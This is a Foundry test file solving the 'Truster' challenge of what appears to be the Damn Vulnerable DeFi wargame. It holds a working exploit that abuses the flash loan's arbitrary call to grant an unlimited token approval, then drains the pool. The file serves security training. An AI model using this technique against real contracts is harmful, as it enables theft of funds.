// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import "src/03.truster/TrusterLenderPool.sol";
import "src/DamnValuableToken.sol";

contract ChallengeTruster is Test {
  TrusterLenderPool public pool;
  DamnValuableToken public token;

  uint256 constant TOKENS_IN_POOL = 1_000_000 ether;

  address public deployer = makeAddr("deployer");
  address public player = makeAddr("player");

  function setUp() public {
    /**
     * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
     */
    vm.startPrank(deployer);
    token = new DamnValuableToken();
    pool = new TrusterLenderPool(token);
    assertEq(address(pool.token()), address(token));
    token.transfer(address(pool), TOKENS_IN_POOL);
    assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
    assertEq(token.balanceOf(player), 0);
  }

  function test_solution() public {
    /**
     * CODE YOUR SOLUTION HERE
     */
    changePrank(player);
    pool.flashLoan(
      0,
      player,
      address(token),
      abi.encodeWithSignature(
        "approve(address,uint256)", player, type(uint256).max
      )
    );

    token.transferFrom(address(pool), player, TOKENS_IN_POOL);
    /**
     * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
     */

    // Player has taken all tokens from the pool
    assertEq(token.balanceOf(player), TOKENS_IN_POOL);
    assertEq(token.balanceOf(address(pool)), 0);
  }
}
